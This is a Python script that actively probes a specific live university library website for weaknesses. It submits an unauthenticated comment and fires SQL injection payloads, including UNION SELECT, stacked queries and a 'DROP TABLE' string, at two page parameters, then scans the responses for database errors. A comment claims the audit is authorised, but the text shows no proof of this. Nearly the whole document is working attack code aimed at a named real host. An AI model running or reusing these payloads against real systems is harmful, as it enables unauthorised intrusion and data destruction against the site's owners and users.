import requests, urllib3, re, hashlib
urllib3.disable_warnings()

BASE = "https://biblioteca.uns.edu.pe"
h = {'User-Agent': 'Mozilla/5.0', 'Referer': BASE + '/inicia_sesion.asp'}

print("="*60)
print("ANALISIS: comentario, ver_libro, alerta - vectores READ/WRITE")
print("="*60)

# ==============================
# VECTOR 1: Comentario sin auth
# ==============================
print("\n[1] POST registra_comentario.asp (sin auth):")
data = {
    'nombre': 'Pendrive Pentest',
    'mail': 'audit@uns.edu.pe',
    'pregunta': 'PENTEST-MARKER-2026: Este comentario fue enviado sin autenticacion como parte de una auditoria de seguridad autorizada.'
}
r = requests.post(BASE + '/registra_comentario.asp', data=data, headers={**h, 'Referer': BASE + '/registra_comentario.htm'}, verify=False, timeout=10, allow_redirects=True)
clean = re.sub(r'<[^>]+>', ' ', r.text)
lines = [l.strip() for l in clean.splitlines() if l.strip()]
print(f"  Status: {r.status_code}, URL: {r.url}")
print(f"  Response snippet: {' | '.join(lines[18:28])}")

# ==============================
# VECTOR 2: ver_libro.asp - SQLi en idm
# ==============================
print("\n[2] ver_libro.asp - SQLi en parametro idm:")
sqli_idm = [
    "371 AND 1=1",
    "371 AND 1=2",
    "371 OR 1=1",
    "371; SELECT 1--",
    "-1 UNION SELECT 1,2,3--",
    "371'",
]

for payload in sqli_idm:
    try:
        r = requests.get(BASE + f'/ver_libro.asp', params={'idm': payload}, headers=h, verify=False, timeout=6, allow_redirects=False)
        text = r.text.lower()
        has_err = any(kw in text for kw in ['microsoft', 'odbc', 'syntax', 'oledb', 'error in', '800a', 'jet'])
        has_data = 'disponible' in text or 'ejemplar' in text or 'biblioteca central' in text
        print(f"  idm={payload!r} -> status={r.status_code}, len={len(r.content)}, db_error={has_err}, has_data={has_data}")
        if has_err:
            for kw in ['microsoft', 'odbc', 'syntax', 'oledb', 'error']:
                if kw in text:
                    idx = text.index(kw)
                    print(f"    >> {r.text[max(0,idx-30):idx+200]}")
                    break
    except Exception as e:
        print(f"  idm={payload!r} -> ERROR: {e}")

# ==============================
# VECTOR 3: alerta_por_titulo.asp - SQLi en letra
# ==============================
print("\n[3] alerta_por_titulo.asp - SQLi en parametro letra:")
for payload in ["A' AND 1=1--", "A' AND 1=2--", "A' OR '1'='1", "A; DROP TABLE--"]:
    try:
        r = requests.get(BASE + f'/alerta_por_titulo.asp', params={'letra': payload}, headers=h, verify=False, timeout=6)
        text = r.text.lower()
        has_err = any(kw in text for kw in ['microsoft', 'odbc', 'syntax', 'oledb', '800a', 'jet'])
        clean = re.sub(r'<[^>]+>', ' ', r.text)
        num = re.search(r'numero.*?registros.*?encontrados.*?(\d+)', clean, re.I | re.DOTALL)
        count = num.group(1) if num else '?'
        print(f"  letra={payload!r} -> status={r.status_code}, registros={count}, db_error={has_err}")
        if has_err:
            print(f"    >> {r.text[r.text.lower().index('error'):r.text.lower().index('error')+300]}")
    except Exception as e:
        print(f"  letra={payload!r} -> {e}")
